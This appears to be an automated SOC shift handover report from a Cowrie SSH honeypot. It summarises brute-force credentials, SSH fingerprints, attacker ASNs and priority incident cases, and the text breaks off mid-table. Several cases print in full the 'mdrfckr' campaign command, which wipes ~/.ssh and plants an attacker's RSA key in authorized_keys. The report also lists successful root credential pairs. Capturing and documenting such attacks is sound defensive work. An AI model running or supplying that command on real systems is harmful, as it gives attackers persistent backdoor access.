# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-11 |
| **Generated At** | 2026-05-11T07:49:15Z |
| **Shift Time** | 07:49 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **387** |
| Confirmed Threats | **359** |
| False Positives Filtered | **28** (7.2%) |
| Unique Attacker IPs | **54** |
| Countries of Origin | **25** |
| High Severity Cases | **34** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **353** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **193** |
| Unique Credential Pairs | **102** |
| Unique Usernames | **51** |
| Unique Passwords | **95** |
| Successful Auth Pairs | **26** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 34 |
| `ubuntu` | 32 |
| `345gs5662d34` | 17 |
| `admin` | 14 |
| `test` | 8 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 17 |
| `3245gs5662d34` | 17 |
| `123456` | 9 |
| `1qaz2wsx` | 3 |
| `qwert@123` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 17 |
| `root` | `3245gs5662d34` | 17 |
| `user3` | `1qaz2wsx` | 3 |
| `ubuntu` | `qwert@123` | 3 |
| `test1` | `test1test1` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `adminadmin` | `154.221.23.179` | 2026-05-11T03:54:02 |
| `root` | `3245gs5662d34` | `154.221.23.179` | 2026-05-11T03:54:05 |
| `root` | `debian12345` | `27.128.240.75` | 2026-05-11T04:03:19 |
| `root` | `3245gs5662d34` | `27.128.240.75` | 2026-05-11T04:03:24 |
| `root` | `debian12345` | `103.143.231.24` | 2026-05-11T04:04:02 |
| `root` | `3245gs5662d34` | `103.143.231.24` | 2026-05-11T04:04:08 |
| `root` | `test2000` | `103.143.231.24` | 2026-05-11T04:06:54 |
| `root` | `adminnimda` | `103.143.231.24` | 2026-05-11T04:12:32 |
| `root` | `123user!@#` | `103.143.231.24` | 2026-05-11T04:15:23 |
| `root` | `admin.222` | `20.123.146.94` | 2026-05-11T04:24:57 |
| `root` | `3245gs5662d34` | `20.123.146.93` | 2026-05-11T04:25:01 |
| `root` | `admin@huawei.com` | `4.210.186.201` | 2026-05-11T04:28:24 |
| `root` | `3245gs5662d34` | `20.123.146.92` | 2026-05-11T04:28:28 |
| `root` | `bitrix` | `20.123.146.94` | 2026-05-11T04:29:15 |
| `root` | `3245gs5662d34` | `20.123.146.94` | 2026-05-11T04:29:19 |
| `root` | `adminadmin` | `4.210.186.201` | 2026-05-11T04:40:59 |
| `root` | `debian12345` | `165.154.227.158` | 2026-05-11T04:44:47 |
| `root` | `3245gs5662d34` | `165.154.227.158` | 2026-05-11T04:44:51 |
| `root` | `adminnimda` | `165.154.227.158` | 2026-05-11T04:47:31 |
| `root` | `123user!@#` | `165.154.227.158` | 2026-05-11T04:52:08 |
| `root` | `test2000` | `165.154.227.158` | 2026-05-11T04:56:42 |
| `root` | `admin@789` | `114.220.238.30` | 2026-05-11T06:49:39 |
| `root` | `3245gs5662d34` | `114.220.238.30` | 2026-05-11T06:49:46 |
| `root` | `bitnami` | `45.170.128.15` | 2026-05-11T07:05:03 |
| `root` | `3245gs5662d34` | `45.170.128.15` | 2026-05-11T07:05:10 |
| `root` | `admin@789` | `45.170.128.15` | 2026-05-11T07:14:17 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **387** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 226 |
| Unknown | 1 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 168 | 10 |
| `03a80b21afa8...` | Modern SSH client | 54 | 5 |
| `e37f354a101a...` | Mirai/variant | 1 | 1 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |
| `873a5fb5fedc...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 168 | 10 | libssh-based |
| `03a80b21afa8...` | libssh | 54 | 5 | Modern SSH client |
| `95420f9d932d...` | libssh | 3 | 2 | — |
| `e37f354a101a...` | libssh | 1 | 1 | Mirai/variant |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 17 | 8 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.143.231.24`, `27.128.240.75`, `154.221.23.179`, `45.170.128.15`, `20.123.146.94`, `165.154.227.158`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **54** |
| Unique ASNs | **40** |
| High-Risk ASNs | **18** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 6 | HIGH |
| `AS8075` | Microsoft Corporation | 6 | HIGH |
| `AS396982` | Google LLC | 2 | HIGH |
| `AS209334` | Modat B.V. | 2 | HIGH |
| `AS398324` | Censys, Inc. | 2 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS18126` | Chubu Telecommunications Company, Inc. | 1 | HIGH |
| `AS13999` | Mega Cable, S.A. de C.V. | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (34)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-260bdfd44290

| Field | Detail |
|---|---|
| **Source IP** | `154.221.23[.]179` |
| **First Seen** | 2026-05-11 03:54 |
| **Last Seen** | 2026-05-11 03:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 03:54:01` | `cowrie.session.connect` |
| `2026-05-11 03:54:01` | `cowrie.client.version` |
| `2026-05-11 03:54:01` | `cowrie.client.kex` |
| `2026-05-11 03:54:02` | `cowrie.login.success` |
| `2026-05-11 03:54:02` | `cowrie.session.params` |
| `2026-05-11 03:54:02` | `cowrie.command.input` |
| `2026-05-11 03:54:02` | `cowrie.command.failed` |
| `2026-05-11 03:54:02` | `cowrie.log.closed` |
| `2026-05-11 03:54:02` | `cowrie.session.params` |
| `2026-05-11 03:54:02` | `cowrie.command.input` |
| `2026-05-11 03:54:03` | `cowrie.session.file_download` |
| `2026-05-11 03:54:03` | `cowrie.log.closed` |
| `2026-05-11 03:54:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.23[.]179` to AbuseIPDB if not already reported
- [ ] Block `154.221.23[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20033de8d579

| Field | Detail |
|---|---|
| **Source IP** | `154.221.23[.]179` |
| **First Seen** | 2026-05-11 03:54 |
| **Last Seen** | 2026-05-11 03:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 03:54:04` | `cowrie.session.connect` |
| `2026-05-11 03:54:04` | `cowrie.client.version` |
| `2026-05-11 03:54:04` | `cowrie.client.kex` |
| `2026-05-11 03:54:05` | `cowrie.login.success` |
| `2026-05-11 03:54:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.23[.]179` to AbuseIPDB if not already reported
- [ ] Block `154.221.23[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-571550de125d

| Field | Detail |
|---|---|
| **Source IP** | `27.128.240[.]75` |
| **First Seen** | 2026-05-11 04:03 |
| **Last Seen** | 2026-05-11 04:03 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 04:03:18` | `cowrie.session.connect` |
| `2026-05-11 04:03:19` | `cowrie.client.version` |
| `2026-05-11 04:03:19` | `cowrie.client.kex` |
| `2026-05-11 04:03:19` | `cowrie.login.success` |
| `2026-05-11 04:03:20` | `cowrie.session.params` |
| `2026-05-11 04:03:20` | `cowrie.command.input` |
| `2026-05-11 04:03:20` | `cowrie.command.failed` |
| `2026-05-11 04:03:20` | `cowrie.log.closed` |
| `2026-05-11 04:03:20` | `cowrie.session.params` |
| `2026-05-11 04:03:20` | `cowrie.command.input` |
| `2026-05-11 04:03:20` | `cowrie.session.file_download` |
| `2026-05-11 04:03:20` | `cowrie.log.closed` |
| `2026-05-11 04:03:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.128.240[.]75` to AbuseIPDB if not already reported
- [ ] Block `27.128.240[.]75` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ea7fdefa744

| Field | Detail |
|---|---|
| **Source IP** | `27.128.240[.]75` |
| **First Seen** | 2026-05-11 04:03 |
| **Last Seen** | 2026-05-11 04:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 04:03:23` | `cowrie.session.connect` |
| `2026-05-11 04:03:23` | `cowrie.client.version` |
| `2026-05-11 04:03:23` | `cowrie.client.kex` |
| `2026-05-11 04:03:24` | `cowrie.login.success` |
| `2026-05-11 04:03:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.128.240[.]75` to AbuseIPDB if not already reported
- [ ] Block `27.128.240[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdcd2c3bc527

| Field | Detail |
|---|---|
| **Source IP** | `103.143.231[.]24` |
| **First Seen** | 2026-05-11 04:04 |
| **Last Seen** | 2026-05-11 04:04 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 04:04:01` | `cowrie.session.connect` |
| `2026-05-11 04:04:01` | `cowrie.client.version` |
| `2026-05-11 04:04:01` | `cowrie.client.kex` |
| `2026-05-11 04:04:02` | `cowrie.login.success` |
| `2026-05-11 04:04:03` | `cowrie.session.params` |
| `2026-05-11 04:04:03` | `cowrie.command.input` |
| `2026-05-11 04:04:03` | `cowrie.command.failed` |
| `2026-05-11 04:04:03` | `cowrie.log.closed` |
| `2026-05-11 04:04:03` | `cowrie.session.params` |
| `2026-05-11 04:04:03` | `cowrie.command.input` |
| `2026-05-11 04:04:04` | `cowrie.session.file_download` |
| `2026-05-11 04:04:04` | `cowrie.log.closed` |
| `2026-05-11 04:04:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.231[.]24` to AbuseIPDB if not already reported
- [ ] Block `103.143.231[.]24` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49f2782dfbc7

| Field | Detail |
|---|---|
| **Source IP** | `103.143.231[.]24` |
| **First Seen** | 2026-05-11 04:04 |
| **Last Seen** | 2026-05-11 04:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 04:04:07` | `cowrie.session.connect` |
| `2026-05-11 04:04:07` | `cowrie.client.version` |
| `2026-05-11 04:04:07` | `cowrie.client.kex` |
| `2026-05-11 04:04:08` | `cowrie.login.success` |
| `2026-05-11 04:04:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.231[.]24` to AbuseIPDB if not already reported
- [ ] Block `103.143.231[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e36b6f3c0e87

| Field | Detail |
|---|---|
| **Source IP** | `103.143.231[.]24` |
| **First Seen** | 2026-05-11 04:06 |
| **Last Seen** | 2026-05-11 04:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 04:06:53` | `cowrie.session.connect` |
| `2026-05-11 04:06:53` | `cowrie.client.version` |
| `2026-05-11 04:06:53` | `cowrie.client.kex` |
| `2026-05-11 04:06:54` | `cowrie.login.success` |
| `2026-05-11 04:06:55` | `cowrie.session.params` |
| `2026-05-11 04:06:55` | `cowrie.command.input` |
| `2026-05-11 04:06:55` | `cowrie.command.failed` |
| `2026-05-11 04:06:55` | `cowrie.log.closed` |
| `2026-05-11 04:06:56` | `cowrie.session.params` |
| `2026-05-11 04:06:56` | `cowrie.command.input` |
| `2026-05-11 04:06:56` | `cowrie.session.file_download` |
| `2026-05-11 04:06:56` | `cowrie.log.closed` |
| `2026-05-11 04:07:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.231[.]24` to AbuseIPDB if not already reported
- [ ] Block `103.143.231[.]24` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2ecf468ab83

| Field | Detail |
|---|---|
| **Source IP** | `103.143.231[.]24` |
| **First Seen** | 2026-05-11 04:06 |
| **Last Seen** | 2026-05-11 04:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 04:06:59` | `cowrie.session.connect` |
| `2026-05-11 04:06:59` | `cowrie.client.version` |
| `2026-05-11 04:06:59` | `cowrie.client.kex` |
| `2026-05-11 04:07:00` | `cowrie.login.success` |
| `2026-05-11 04:07:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.231[.]24` to AbuseIPDB if not already reported
- [ ] Block `103.143.231[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bc0d664486a

| Field | Detail |
|---|---|
| **Source IP** | `103.143.231[.]24` |
| **First Seen** | 2026-05-11 04:12 |
| **Last Seen** | 2026-05-11 04:12 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 04:12:31` | `cowrie.session.connect` |
| `2026-05-11 04:12:31` | `cowrie.client.version` |
| `2026-05-11 04:12:31` | `cowrie.client.kex` |
| `2026-05-11 04:12:32` | `cowrie.login.success` |
| `2026-05-11 04:12:32` | `cowrie.session.params` |
| `2026-05-11 04:12:32` | `cowrie.command.input` |
| `2026-05-11 04:12:32` | `cowrie.command.failed` |
| `2026-05-11 04:12:33` | `cowrie.log.closed` |
| `2026-05-11 04:12:33` | `cowrie.session.params` |
| `2026-05-11 04:12:33` | `cowrie.command.input` |
| `2026-05-11 04:12:33` | `cowrie.session.file_download` |
| `2026-05-11 04:12:33` | `cowrie.log.closed` |
| `2026-05-11 04:12:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.231[.]24` to AbuseIPDB if not already reported
- [ ] Block `103.143.231[.]24` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b76366522d6c

| Field | Detail |
|---|---|
| **Source IP** | `103.143.231[.]24` |
| **First Seen** | 2026-05-11 04:12 |
| **Last Seen** | 2026-05-11 04:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 04:12:36` | `cowrie.session.connect` |
| `2026-05-11 04:12:36` | `cowrie.client.version` |
| `2026-05-11 04:12:37` | `cowrie.client.kex` |
| `2026-05-11 04:12:38` | `cowrie.login.success` |
| `2026-05-11 04:12:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.231[.]24` to AbuseIPDB if not already reported
- [ ] Block `103.143.231[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c07a7eddf78

| Field | Detail |
|---|---|
| **Source IP** | `103.143.231[.]24` |
| **First Seen** | 2026-05-11 04:15 |
| **Last Seen** | 2026-05-11 04:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 04:15:22` | `cowrie.session.connect` |
| `2026-05-11 04:15:22` | `cowrie.client.version` |
| `2026-05-11 04:15:22` | `cowrie.client.kex` |
| `2026-05-11 04:15:23` | `cowrie.login.success` |
| `2026-05-11 04:15:23` | `cowrie.session.params` |
| `2026-05-11 04:15:23` | `cowrie.command.input` |
| `2026-05-11 04:15:23` | `cowrie.command.failed` |
| `2026-05-11 04:15:24` | `cowrie.log.closed` |
| `2026-05-11 04:15:24` | `cowrie.session.params` |
| `2026-05-11 04:15:24` | `cowrie.command.input` |
| `2026-05-11 04:15:24` | `cowrie.session.file_download` |
| `2026-05-11 04:15:24` | `cowrie.log.closed` |
| `2026-05-11 04:15:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.231[.]24` to AbuseIPDB if not already reported
- [ ] Block `103.143.231[.]24` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d119e4a5f7df

| Field | Detail |
|---|---|
| **Source IP** | `103.143.231[.]24` |
| **First Seen** | 2026-05-11 04:15 |
| **Last Seen** | 2026-05-11 04:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 04:15:27` | `cowrie.session.connect` |
| `2026-05-11 04:15:27` | `cowrie.client.version` |
| `2026-05-11 04:15:28` | `cowrie.client.kex` |
| `2026-05-11 04:15:29` | `cowrie.login.success` |
| `2026-05-11 04:15:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.231[.]24` to AbuseIPDB if not already reported
- [ ] Block `103.143.231[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0d703c416f1

| Field | Detail |
|---|---|
| **Source IP** | `20.123.146[.]94` |
| **First Seen** | 2026-05-11 04:24 |
| **Last Seen** | 2026-05-11 04:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
